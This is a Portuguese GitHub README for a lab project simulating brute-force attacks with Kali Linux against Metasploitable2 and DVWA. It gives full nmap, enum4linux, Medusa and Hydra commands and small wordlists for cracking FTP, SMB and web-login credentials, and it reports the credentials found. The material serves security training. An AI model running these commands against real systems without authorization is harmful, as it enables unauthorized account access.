# Projeto Medusa Kali Linux — Laboratório de Ataques de Força Bruta


## ❗ Aviso Legal ❗

Todos os testes descritos neste projeto foram realizados **somente em ambiente controlado** (Kali Linux + Metasploitable2/DVWA). 

``NÃO EXECUTE ESTES COMANDOS EM SISTEMAS SEM AUTORIZAÇÃO.``

---

## 🎯 Objetivo do  repositório?

Simular ataques de força bruta em serviços comuns (FTP, SMB e formulários web) utilizando **Kali Linux**, **Medusa** e **Hydra**, documentando os testes e propondo medidas de mitigação.

---

## Ambiente de Teste

* **VM Atacante:** Kali Linux
* **VM Alvo:** Metasploitable2 / DVWA
* **IP da VM alvo:** `192.168.56.101`
* **Rede:** Host-Only/Internal Network
* **Estrutura de pastas do projeto:**


---

## Ferramentas

* Kali Linux
* Medusa (ftp, smbnt)
* Hydra (formulário web)
* Nmap


---
## TESTE DE CONEXÃO

Para verificar a conectividade entre as duas máquinas virtuais, utilize o comando ``ping`` para enviar pacotes ICMP e confirmar se os hosts conseguem se comunicar.`` ping -c 3 [IP do Metasploitable2]``

Exemplo:

``` bash
ping -c 3 192.168.56.101
```


<img width="1056" height="633" alt="pingdamaquina" src="https://github.com/user-attachments/assets/9652c021-ca3f-4428-897c-6864dc6386e2" />


---


## 📡 Reconhecimento das portas com Nmap
O primeiro passo no processo de varredura é executar o ``nmap``, que nos permitirá identificar serviços ativos e portas abertas. nmap [endereço_ip_do_metasploitable2]


``` bash
nmap 192.168.56.101
```



🔽 Saída esperada:


<img width="772" height="764" alt="nmapcmand" src="https://github.com/user-attachments/assets/3f833af3-5710-4883-938d-996c958ec110" />


Vamos focar nas portas 21, 22, 80, 445 e 139 com o comando:


``` bash
nmap -sV -p 21,22,80,445,139 192.168.56.101
```



<img width="901" height="594" alt="nmapsaida" src="https://github.com/user-attachments/assets/c6fc742d-7330-4f58-b422-8c7ffbd7a67e" />



---




## Ataque de força bruta no serviço FTP


Durante a análise, observamos que a porta 21/TCP está ativa, indicando a presença de um serviço FTP (File Transfer Protocol).
Esse protocolo é utilizado para movimentação de arquivos entre sistemas e pode ser alvo de ataques de força bruta, caso não esteja devidamente protegido.



A identificação da porta foi feita por meio do Nmap:



<img width="901" height="345" alt="verificandonmap" src="https://github.com/user-attachments/assets/eba9677b-70e4-446a-8820-a826d52a6632" />




## Wordlists



Nesta fase, foram elaboradas duas wordlists: uma contendo nomes de usuários e outra com senhas prováveis.


Os comandos utilizados foram:



Lista de usuários:

``` bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt`
```

Lista de senhas:


``` bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```



---



## 2) Ataque FTP (Medusa)


Nesta fase do teste, utilizaremos o Medusa, uma ferramenta de brute force, para tentar descobrir credenciais válidas do serviço FTP. Para isso, usaremos as listas de usuários e senhas que criamos anteriormente.

``` bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```
Exemplo: 

<img width="733" height="821" alt="medusacod" src="https://github.com/user-attachments/assets/5af1314b-db4c-452b-a913-75f4fbd72e80" />



## Acessando o serviço FTP com as credenciais encontradas


<img width="1117" height="765" alt="acessoamaquina" src="https://github.com/user-attachments/assets/4b076eeb-7fcd-49fe-9301-057f830bdf98" />




---















## 4) Brute Force em Formulário Web (DVWA)


Formulários de login em páginas web também podem ser alvo de ataques de brute force. 
Usando o `DevTools (F12)`, é possível inspecionar a requisição e identificar os campos necessários para configurar o ataque.

![etapa1](https://github.com/user-attachments/assets/109051aa-0d3c-48f6-a2e4-a57825f6b17c)





---





## Criação das wordlists

Lista de usuários:

``` bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```




Lista de senhas:

``` bash

echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```




---




## Ataque de força bruta no formulário de login




Nesta fase, o Medusa será utilizado para realizar brute force contra a aplicação web, empregando as wordlists geradas. Os campos identificados no DevTools foram usados para configurar a requisição.



medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6








🔽 Saída esperada:








<img width="720" height="790" alt="image" src="https://github.com/user-attachments/assets/a524bd05-74aa-488a-916b-f096f8f18a90" />



---




## Ferramneta Hydra 



Entre as opções de brute force, o Hydra se destaca pela flexibilidade e velocidade. Ele possibilita passar listas de usuários e senhas juntamente com os parâmetros do formulário de login.

Exemplo de uso:

``` bash
hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
```




🔽 Saída esperada:








<img width="703" height="790" alt="hydra" src="https://github.com/user-attachments/assets/04c946cf-435b-4a1e-a3ad-0be1bcb11a9c" />





O USUÁRIO E A SENHA ENCONTRADOS FORAM:` ADMIN / PASSWORD`

---



## Ataque ao SMB (Samba) — serviço usado para compartilhar arquivos e impressoras.

Para descobrir se o SMB está disponível, rode: ``nmap -sV -p 445 192.168.56.101.``


<img width="667" height="371" alt="image" src="https://github.com/user-attachments/assets/ff9104b1-2d5d-4874-a9d3-596cb1548553" />

--
A porta 445 foi identificada na imagem como open, indicando ausência de filtragem de firewall. 
Dessa forma, procede‑se com a enumeração da porta para obtenção de informações do host, cuja saída será redirecionada para o arquivo ``enum4_output.txt:``




```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```




🔽 Saída esperada:





<img width="693" height="799" alt="image" src="https://github.com/user-attachments/assets/27ba4413-5dc0-421b-8d60-842c76456ec2" />





---

## WORDLIST

Com a lista de possíveis usuários em mãos, passamos à geração das wordlists. Execute os comandos abaixo:

Criação da lista de usuários:

```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
```




Criação da lista de senhas:


```bash
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```



---


## Ataque de força bruta contra o serviço SMB usando medusa



```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```



🔽 Saída esperada:




<img width="713" height="792" alt="image" src="https://github.com/user-attachments/assets/78535b4f-f298-4507-8d70-208dc95afcbe" />



------


## Teste de login com o usuário msfadmin:


<img width="661" height="608" alt="image" src="https://github.com/user-attachments/assets/de03df06-91ac-483e-a220-e45488815b81" />



------







